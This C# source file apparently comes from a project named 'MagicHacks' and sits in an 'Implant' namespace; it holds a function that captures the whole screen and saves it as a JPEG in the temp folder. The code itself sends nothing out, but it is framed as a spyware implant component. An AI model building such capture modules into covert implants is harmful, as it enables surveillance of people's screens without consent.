using System;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Windows.Forms;

namespace MagicHacks.cCore.Implant
{
    internal sealed class cScreenshot
    {

        public static bool getScreen()
        {
            try
            {
                string cPath = Path.GetTempPath();
                Rectangle bounds = Screen.GetBounds(Point.Empty);
                using (Bitmap bit = new Bitmap(bounds.Width, bounds.Height))
                {
                    using (Graphics g = Graphics.FromImage(bit))
                    {
                        g.CopyFromScreen(Point.Empty, Point.Empty, bounds.Size);
                    }
                    bit.Save(cPath + "Screen.jpeg", ImageFormat.Jpeg);
                    Console.WriteLine(cPath);
                    Console.ReadKey();
                }
                return true;
            }
            catch { return false; }
        }
    }
}
